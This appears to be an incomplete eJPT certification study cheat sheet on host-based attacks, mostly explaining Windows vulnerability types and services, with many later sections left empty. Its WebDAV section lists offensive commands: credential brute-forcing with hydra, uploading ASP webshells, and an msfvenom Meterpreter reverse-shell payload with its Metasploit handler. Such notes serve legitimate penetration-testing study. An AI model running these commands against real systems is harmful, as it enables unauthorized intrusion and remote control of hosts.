<p align="center">
    <img src="LogoBiggerBW.png" alt="BPM Circuits" width="300" />
</p>

<p align="center">
  eJPT-CheatSheets<br>
  Bartosz Pokrywka
</p>

<p align="center">
    Usefull info and commands for eJPT cert exam
</p>

- [Introduction](#introduction)
    - [What Are System/Host Based Attacks?](#what-are-systemhost-based-attacks)
    - [System/Host Based Attacks](#systemhost-based-attacks)
- [Overview of Windows Vulnerabilities](#overview-of-windows-vulnerabilities)
- [Exlpoiting Windows Vulnerabilities](#exlpoiting-windows-vulnerabilities)
- [Windows Privilige Escalation](#windows-privilige-escalation)
- [Windows File System Vulnerabilities](#windows-file-system-vulnerabilities)
- [Windows Credential Dumping](#windows-credential-dumping)
- [Winodws Lateral Movement](#winodws-lateral-movement)
- [Overview of Linux Vulnerabilities](#overview-of-linux-vulnerabilities)
- [Exploiting Linux Vulnerabilities](#exploiting-linux-vulnerabilities)
- [Linux Privilige Escalation](#linux-privilige-escalation)
- [Linux File System Vulnerabilities](#linux-file-system-vulnerabilities)
- [Linux Credential Dumping](#linux-credential-dumping)


# Introduction

### What Are System/Host Based Attacks?

- System/Host based attacks are attacks that are targeted towards a
specific system or host running a specific operating system, for example,
Windows or Linux.

- Network services are not the only attack vector that can be targeted
during a penetration test.

- System/Host based attacks usually come in to play after you have gained
access to a target network, whereby, you will be required to exploit
servers, workstations or laptops on the internal network.

### System/Host Based Attacks

- System/Host based attacks are primarily focused on exploiting inherent
vulnerabilities on the target OS.

- Unlike network based attacks, host based attacks are much more
specialized and require an understanding of the target operating system
and the vulnerabilities that affect said operating systems.

- System/Host based attacks involve exploiting misconfigurations and
inherent vulnerabilities within the target OS.

# Overview of Windows Vulnerabilities

### History of Windows Vulnerabilities:

- Microsoft Windows maintains a dominant position in the global operating system market, making it a primary target for cyber threats due to its extensive usage.

- It has faced numerous severe vulnerabilities over the past 15 years, from MS08-067 (Conflicker) to MS17-010 (EternalBlue), which have been relatively easy to exploit due to publicly available exploit code.

- The widespread adoption of Windows amplifies the impact of these vulnerabilities, prompting continuous security updates from Microsoft to safeguard users.

### Windows Vulnerabilities

Microsoft Windows has various OS versions and releases which makes the threat
surface fragmented in terms of vulnerabilities. For example, vulnerabilities that
exist in Windows 7 are not present in Windows 10.

- Regardless of the various versions and releases, all Windows OS’s share a
likeness given the development model and philosophy:

    - Windows OS’s have been developed in the C programming language, making
    them vulnerable to buffer overflows, arbitrary code execution etc.
    - By default, Windows is not configured to run securely and require a proactive
    implementation of security practices in order to configure Windows to run
    securely.
    - Newly discovered vulnerabilities are not immediately patched by Microsoft and
    given the fragmented nature of Windows, many systems are left unpatched.

- The frequent releases of new versions of Windows is also a contributing factor to
exploitation, as many companies take a substantial length of time to upgrade their
systems to the latest version of Windows and opt to use older versions that may
be affected by an increasing number of vulnerabilities.

- In addition to inherent vulnerabilities, Windows is also vulnerable to cross
platform vulnerabilities, for example SQL injection attacks.

- Systems/hosts running Windows are also vulnerable to physical attacks like;
theft, malicious peripheral devices etc.

### Types of Windows Vulnerabilities

- Information disclosure - Vulnerability that allows an attacker to access
confidential data.

- Buffer overflows - Caused by a programming error, allows attackers to write data
to a buffer and overrun the allocated buffer, consequently writing data to
allocated memory addresses.

- Remote code execution - Vulnerability that allows an attacker to remotely execute
code on the target system.

- Privilege escalation - Vulnerability that allows an attacker to elevate their
privileges after initial compromise.

- Denial of Service (DOS) - Vulnerability that allows an attacker to consume a
system/host’s resources (CPU, RAM, Network etc) consequently preventing the
system from functioning normally.

### Frequently Exploited Windows Services

**Microsoft IIS (Internet Information Services):**
- Port: TCP 80/443
- Proprietary web server software developed by Microsoft that runs on Windows.

**WebDAV (Web Distributed Authoring & Versioning):**
- Port TCP 80/443
- HTTP extension that allows clients to update, delete, move and copy files on a web server. WebDAV is used to enable a web server to act as a file server.

**SMB/CIFS (Server Message Block Protocol):**
- Port: 445
- Network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN).

**RDP(Remote Desktop Protocol):**
- Port TCP 3389
- Proprietary GUI remote access protocol developed by Microsoft and is used to remotely authenticate and interact with a Windows system.

**WinRM (Windows Remote Management Protocol):**
- Port 5986/443
- Windows remote management protocol that can be used to facilitate remote access with Windows systems.

# Exlpoiting Windows Vulnerabilities

### Microsoft IIS

- IIS (Internet Information Services) is a proprietary extensible web server software developed by Microsoft for use with the Windows NT family.
- It can be used to host websites/web apps and provides administrators with a robust GUI for managing websites.
- IIS can be used to host both static and dynamic web pages developed in ASP.NET and PHP.
- Typically configured to run on ports 80/443.
- Supported executable file extensions: 
    - .asp
    - .aspx 
    - .config 
    - .php

### WebDAV

- WebDAV (Web-based Distributed Authoring and Versioning) is a set of extensions to the HTTP protocol which allow users to collaboratively edit and manage files on remote web servers.
- WebDAV essentially enables a web server to function as a file server for collaborative authoring.
- WebDAV runs on top Microsoft IIS on ports 80/443.
- In order to connect to a WebDAV server, you will need to provide legitimate credentials. This is because WebDAV implements authentication in the form of a username and password.

### WebDAV Exploitation

- The first step of the exploitation process will involve identifying whether WebDAV has been configured to run on the IIS web server.
    - nmap scan with version detection and default scripts
    - *nmap -sV -p 80 --script=http-enum* target

- We can perform a brute-force attack on the WebDAV server in order to identify legitimate credentials that we can use for authentication.
    - *hydra -L userlist -P passlist* target *http-get /webdav/*

- After obtaining legitimate credentials, we can authenticate with the WebDAV server and upload a malicious .asp payload that can be used to execute arbitrary commands or obtain a reverse shell on the target.
    - *davtest -auth login:pass -url* target
    - **cadaver** target
    - webshell:
        - kali linux: /usr/share/webshells/asp, etc.

### Metasploit

1. Method: 

    **msfvenom**

    - *msfvenom -p windows/meterpreter/reverse_tcp LHOST=youripaddress LPORT=yourport -f asp > shell.asp*

    Then in msfconsole:
 
        > use multi/handler

        > set payload windows/meterpreter/reverse_tcp (same as created by msfvenom)

2. Method (faster):

    msfconsole:

        > use exploit/windows/iis/iis_webdav_upload_asp

### Tools

- **davtest** - Used to scan, authenticate and exploit a WebDAV server.
    + Pre-installed on most offensive penetration testing distributions like Kali
and Parrot OS.
- **cadaver** - cadaver supports file upload, download, on-screen display, in- place editing, namespace operations (move/copy), collection creation and deletion, property manipulation, and resource locking on WebDAV servers.
    + Pre-installed on most offensive penetration testing distributions like Kali and Parrot OS.

# Windows Privilige Escalation

# Windows File System Vulnerabilities

# Windows Credential Dumping

# Winodws Lateral Movement

# Overview of Linux Vulnerabilities

# Exploiting Linux Vulnerabilities

# Linux Privilige Escalation

# Linux File System Vulnerabilities

# Linux Credential Dumping
